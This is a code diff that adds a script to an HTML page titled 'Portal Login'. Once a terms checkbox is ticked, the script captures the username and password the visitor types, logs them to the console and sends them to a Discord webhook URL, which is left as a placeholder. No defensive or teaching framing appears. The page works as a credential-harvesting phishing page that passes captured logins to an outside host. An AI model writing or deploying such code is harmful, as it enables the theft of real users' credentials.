@@ -176,11 +176,47 @@ a {
 }
     </style>
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
-    <title>Portal Login</title>
-    
-    
-<script language="javascript" type="text/javascript">
-</script>
+     <title>Portal Login</title>
+    <script>
+        function validateLogin() {
+            // Check if the user agreed to the terms
+            var agreed = document.getElementById("agreement_agree").checked;
+            
+            if (!agreed) {
+                // If not agreed, do nothing
+                return;
+            }
+            
+            // If agreed, store username and password
+            var username = document.getElementById("user").value;
+            var password = document.getElementById("password").value;
+            
+            // Now you can use the username and password variables as needed
+            console.log("Username:", username);
+            console.log("Password:", password);
+            var formData = {
+        content: "username " + username + " password" + password
+    };
+
+    fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        alert('Message sent successfully!');
+    })
+    .catch(error => {
+        console.error('There was a problem with your fetch operation:', error);
+        alert('Error: Message could not be sent');
+    });
+        }
+    </script>
 </head>
 
 <body style="background-color:  ; ">
